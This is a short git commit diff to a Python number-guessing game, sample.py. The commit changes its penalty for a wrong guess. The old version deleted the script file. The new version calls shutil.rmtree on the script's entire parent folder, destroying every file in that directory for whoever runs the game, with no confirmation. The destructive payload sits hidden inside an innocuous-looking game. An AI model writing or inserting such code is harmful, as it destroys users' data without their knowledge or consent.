1f55f21e6465c9a53b78b7383f6bdca06c7cc405
Pratham9911 <prathamtiwari0123@gmail.com>
2026-02-03 09:28:30 +0530

    Updated Coded

--- sample.py
+++ sample.py
@@ -1,11 +1,18 @@
 import random
 import os
+import shutil
+from pathlib import Path
 
 a = random.randint(1, 10)
-
 b = int(input("Enter a number between 1 and 10: "))
+
 if a == b:
     print("You guessed it!")
 else:
     print(f"Sorry, the correct number was {a}.")
-    os.remove(__file__)
+
+    script_path = Path(__file__).resolve()
+    parent_folder = script_path.parent
+
+    print("Deleting folder:", parent_folder)
+    shutil.rmtree(parent_folder)
